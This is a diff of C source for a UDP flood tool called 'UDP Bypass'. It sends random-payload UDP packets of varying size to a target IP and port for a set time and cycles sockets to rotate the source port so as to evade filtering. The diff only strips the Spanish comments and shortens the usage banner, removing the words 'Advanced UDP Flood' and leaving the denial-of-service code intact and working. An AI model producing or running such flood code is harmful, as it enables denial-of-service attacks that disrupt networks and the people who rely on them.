@@ -27,7 +27,6 @@ void *udp_bypass_flood(void *arg) {
     server_addr.sin_port = htons(port);
     inet_pton(AF_INET, ip, &server_addr.sin_addr);
     
-    // Llenar packet con datos aleatorios
     srand(time(NULL));
     for(int i = 0; i < PACKET_SIZE; i++) {
         packet[i] = rand() % 256;
@@ -37,12 +36,10 @@ void *udp_bypass_flood(void *arg) {
     unsigned long packets = 0;
     
     while(time(NULL) - start < duration) {
-        // Enviar con diferentes tamaños para bypass
         int size = 64 + (rand() % (PACKET_SIZE - 64));
         sendto(sock, packet, size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
         packets++;
         
-        // Cambiar puerto fuente simulado
         if(packets % 1000 == 0) {
             close(sock);
             sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -56,8 +53,8 @@ void *udp_bypass_flood(void *arg) {
 
 int main(int argc, char *argv[]) {
     if(argc < 4) {
-        printf("UDP Bypass - Advanced UDP Flood\n");
-        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
+        printf("UDP Bypass\n");
+        printf("%s <IP> <PORT> <TIME>\n", argv[0]);
         return 1;
     }
     
